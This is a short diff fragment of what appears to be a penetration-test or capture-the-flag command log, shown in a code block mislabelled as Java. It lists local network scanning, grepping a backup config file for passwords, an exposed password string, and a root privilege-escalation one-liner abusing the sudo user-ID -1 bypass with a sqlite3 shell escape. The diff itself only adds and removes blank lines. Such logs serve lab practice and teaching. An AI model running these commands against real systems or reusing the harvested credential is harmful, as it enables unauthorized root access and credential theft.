@@ -1,4 +1,5 @@
 ```java
+
 neofetc
 sudo arp-scan -I eth0 --localnet
 ping -c 1 192.168.153.160
@@ -43,7 +44,5 @@ cat app.ini.bak | grep -v "^;" | grep -i pass
 UfFPTF8C8jjxVF2m
 sudo -l
 sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
-
-
 ```
 
